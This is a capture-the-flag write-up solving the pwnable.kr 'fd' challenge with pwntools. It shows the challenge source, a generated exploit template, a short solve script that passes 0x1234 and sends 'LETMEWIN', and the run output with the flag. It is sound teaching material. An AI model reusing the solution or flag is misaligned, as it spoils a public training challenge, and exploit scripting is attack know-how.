---
title: "Pwnable.kr: fd"
date: 2021-02-02T06:57:42-06:00
draft: false
subtitle: "Using pwntools to solve a simple challenge that does not require binary exploitation"
tags: ["pwn template", "file-descriptor", "pwnable.kr", "easy"]
author: "<a href='https://twitter.com/ebeip90'>ebeip90</a>"
---

[Pwnable.kr](Pwnable.kr]) is a website that offers exploitable CTF challenges, with four difficulty categories.  Today, we'll be looking at a very simple challenge, `fd`.  The following Pwntools features are demonstrated hereL

* `pwn template` command-line utility for generating exploit scripts
* Magic `args` for setting runtime arguments

<!--more-->

## Getting Started

For this challenge, we are provieded a binary `fd` and the corresponding source code, `fd.c`.

```c {linenos=table,hl_lines=[10, 13, 15]}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```

By looking at the source code, we can see that htere is a `read` syscall, that operates on a file descriptor, and compares the data it receives to a pre-defined string `"LETMEWIN"`.

## Vulnerability Info

### Background on File Descriptors

By default, whenever a new process launches, there are three file descriptors -- stdin is `STDIN_FILENO==0`, and is generally where input comes from.  Output comes from `STDOUT_FILENO==1`, and ancillary error information is sent to stderr, `STDERR_FILENO==2`.

We want to send information to `stdin`, so we want the `read()` call to use file descriptor #0.

### File Descriptor Offset 0x1234

The `fd` binary takes a single command-line argument, which is the file descriptor to read from.  It subtracts `0x1234` from the file descriptor, and then reads from it and compares to the `"LETMEWIN"` string.

```c {hl_lines=[1, 3]}
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
```

In order to have data received, we need to provide a value that is 0x1234 higher than the file descriptor we want to send data to.  Since `STDIN_FILENO==0`, we want to provide `0x1234`, such that `0x1234-0x1234==0==STDIN_FILENO`.

## Pwntools Script Templates

Generally, I reccomend using `pwn template` ([documentation](https://docs.pwntools.com/en/latest/commandline.html#pwn-template)) to generate a template for exploitation.

```bash
$ pwn template -q \
    --host pwnable.kr \
    --port 2222 \
    --user fd \
    --password guest \
    --path /home/fd/fd \
    > exploit.py
```

>  If the command `pwn` is not available to you, you may need to put ~/.local/bin into your `$PATH` environment variable

This will connect to the remote server and download the binary at the path provided by `--path` to the local directory, as well as create a template script for running the binary locally, as well as via running it remotely on the `pwnable.kr` server via SSH.

For the sake of showing the template that is generated, you should see something like this what is shown below.

In future posts, this template will be ommitted, and it'll be assumed that the template was autogenerated and the *EXPLOIT GOES HERE* code will be the only thing shown.

The details of this template are outside the scope of this document, but the short version is that everything is set up for you and you can invoke your script and it will automatically connect to `pwnable.kr`'s SSH server.  If you were to pass e.g. `python exploit.py LOCAL`, then the binary would run locally.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwnable.kr --port 2222 --user fd --password guest --path /home/fd/fd
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fd')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'fd'
password = args.PASSWORD or 'guest'
remote_path = '/home/fd/fd'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```

## Exploitation

We need to provide a file descriptor as `argv[1]` to the specified script, which we can do easily with the `start()` function (which invokes `local()` or `remote()` as needed).

Then we need to send the data to file descriptor 0x1234-0x1234==0, which is stdin.  Since this is the standard file descriptor for input, we can use the `pwntools` tube function, [sendline](http://docs.pwntools.com/en/latest/tubes.html?highlight=sendline#pwnlib.tubes.tube.tube.sendline).

After we send the expected string, the `fd` program will send us the contents of the flag file, which we can use [recvall](http://docs.pwntools.com/en/latest/tubes.html?highlight=recvall#pwnlib.tubes.tube.tube.recvall) to get.

```c
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
```

### Python Exploit

The exploit is rather straightforward, only requiring the correct argument in `argv[1]` and then sending the expected data.  We have to convert it to a string first, so that it can be passed along as an argument.  We can pass this argument to either.

The remote program will send us `good job :)` and then the contents of the flag.

The last line that we receive (`lines[-1]`) should be the password, so we log it with `log.success` to the console.  

We also set `context.log_level='debug'` so that we can see all of the traffic sent and received by the challenge binary.  I placed this line after `start` since there is a lot going on behind the scenes to set up the remote process, and we only care about the data sent and received.

You can see the full debug output of everything that happens by running your exploit with `python exploit.py DEBUG`.

```python
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
io = start([str(0x1234)])
context.log_level = 'debug'
io.sendline('LETMEWIN')
data = io.recvall()
lines = data.splitlines()
success(lines[-1])
```

### Running the exploit

Now we can run the exploit, and see what happens!  The last line is the flag.

First, a local copy of the binary is loaded into memory, to set `context.binary` so that everything is set up for Intel i386 architecture.  We can see some information about the binary printed out

```pyt
$ python exploit.py
[*] '/Users/zachriggle/ctf-solutions/pwnable.kr/toddler/fd/fd'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to pwnable.kr on port 2222: Done
```

Next, a connection to the pwnable.kr server is established.  A temporary directory is created, so that if we need to create files we can (we don't for this challenge, but it's a useful feature) and symlinks are created for all of the files in `/home/fd`.

````
[*] fd@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (9B)
[*] Closed SSH channel with pwnable.kr
[*] Working directory: '/tmp/tmp.9VrXb97Lur'
[+] Opening new channel: 'ln -s /home/fd/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with pwnable.kr
````

Next, the `fd` process itself is started on the remote server.  We send the correct information, and receive a response from the server.

```
[+] Starting remote process '/home/fd/fd' on pwnable.kr: pid 339379
[DEBUG] Sent 0x9 bytes:
    b'LETMEWIN\n'
[+] Receiving all data: Done (62B)
[DEBUG] Received 0xc bytes:
    b'good job :)\n'
[DEBUG] Received 0x32 bytes:
    b'mommy! I think I know what a file descriptor is!!\n'
[*] Stopped remote process 'fd' on pwnable.kr (pid 339379)
[+] mommy! I think I know what a file descriptor is!!
```

## Debugging Locally

If you would like to debug the binary locally, try launching the `exploit.py` with `GDB` as an extra argument: `python exploit.py LOCAL GDB DEBUG`.  The three extra arguments achieve the following:

* `LOCAL` runs the challenge binary on your local system, instead of on Pwnable.kr's server
* `GDB` attaches a debugger to the process, so you can single-step through the challenge if needed.  
  * I strongly recommend using [pwndbg](https://pwndbg.com) in order to assist in the debugging process
* `DEBUG` sets the standard logging level, so you'll get to see what's happening behind the scenes and all traffic.
  * If you use this without `LOCAL` you'll also see some SSH traffic to run a Python script to invoke the challenge binary, `fd`.